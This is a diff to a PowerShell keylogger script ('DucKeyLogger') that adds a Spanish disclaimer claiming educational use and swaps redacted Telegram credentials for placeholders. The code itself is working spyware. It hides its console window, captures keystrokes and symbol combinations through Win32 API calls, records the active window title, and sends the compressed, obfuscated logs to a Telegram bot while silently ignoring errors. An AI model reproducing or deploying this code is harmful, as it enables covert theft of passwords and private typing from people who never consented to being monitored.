@@ -1,4 +1,18 @@
-# AGREGAR AL INICIO de tu keylogger.ps1 - STEALTH MODE
+# ============================================================================================================ #
+# Este software, denominado DucKeyLogger, es propiedad de @marichu_kt.                                         #
+# Forma parte del proyecto: https://github.com/marichu-kt/DucKeyLogger                                         #
+#                                                                                                              #
+# Se proporciona única y exclusivamente con fines educativos y de investigación en seguridad.                  #
+# Como autor no me hago responsable del uso indebido, daños o perjuicios derivados de este código.             #
+#                                                                                                              #
+# El uso de herramientas de registro de teclas (keyloggers) en sistemas o cuentas ajenas,                      #
+# sin el consentimiento expreso y por escrito de su propietario, puede vulnerar la legislación                 #
+# vigente en materia de protección de datos y delitos informáticos (por ejemplo, normativa                     #
+# de protección de datos y el Código Penal del país correspondiente).                                          #
+#                                                                                                              #
+# Úsalo únicamente en entornos de prueba y siempre con autorización previa y explícita.                        #
+# ============================================================================================================ #
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -8,11 +22,9 @@ public class Stealth {
 }
 "@
 
-# Ocultar ventana inmediatamente
 $consolePtr = [Stealth]::GetConsoleWindow()
-[Stealth]::ShowWindow($consolePtr, 0)  # 0 = Ocultar
+[Stealth]::ShowWindow($consolePtr, 0)
 
-# Keylogger Mejorado - Versión Final con Ofuscación
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -27,9 +39,9 @@ public class WinAPI {
 }
 "@
 
-# Configuración
-$token = "XXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXX"
-$chatId = "XXXXXXXXXX"
+# Configuración de Telegram
+$token = "TU_BOT_TOKEN_AQUI"
+$chatId = "TU_CHAT_ID_AQUI"
 
 function Compress-Text {
     param([string]$Text)
@@ -53,7 +65,7 @@ function Send-Telegram {
         $body = @{chat_id=$chatId; text=$compressedMessage} | ConvertTo-Json
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 3
     } catch {
-        # Silenciar errores
+        # Manejo de errores silencioso
     }
 }
 
@@ -64,7 +76,7 @@ function Get-ActiveWindow {
     return $buffer.ToString()
 }
 
-Send-Telegram "Keylogger Mejorado ACTIVADO - $(Get-Date)"
+Send-Telegram "Keylogger ACTIVADO - $(Get-Date)"
 
 $buffer = ""
 $lastSendTime = Get-Date
@@ -72,7 +84,7 @@ $keyStates = @{}
 $currentWindow = ""
 $lastWindow = ""
 
-Write-Host "Keylogger Mejorado - EJECUTANDOSE"
+Write-Host "Keylogger - EJECUTANDOSE"
 Write-Host "Envio cada 10 caracteres con ofuscacion..."
 Write-Host "Presiona Ctrl+C para detener"
 
@@ -112,10 +124,9 @@ try {
         $isAltPressed = [WinAPI]::GetAsyncKeyState(18) -band 0x8000
         $currentTime = Get-Date
         
-        # SISTEMA MEJORADO: Una tecla a la vez
         $keyProcessed = $false
         
-        # COMBINACIONES ALT GR (prioridad máxima)
+        # COMBINACIONES ALT GR
         if ($isCtrlPressed -and $isAltPressed) {
             # AltGr + 2 = @
             if ([WinAPI]::GetAsyncKeyState(50) -band 0x8000 -and -not $keyStates[500]) {
@@ -160,7 +171,7 @@ try {
         
         # Si no se procesó AltGr, verificar teclas normales
         if (-not $keyProcessed) {
-            # SÍMBOLOS CON SHIFT (prioridad sobre números)
+            # SÍMBOLOS CON SHIFT
             if ($isShiftPressed) {
                 # Shift + 1 = !
                 if ([WinAPI]::GetAsyncKeyState(49) -band 0x8000 -and -not $keyStates[1001]) {
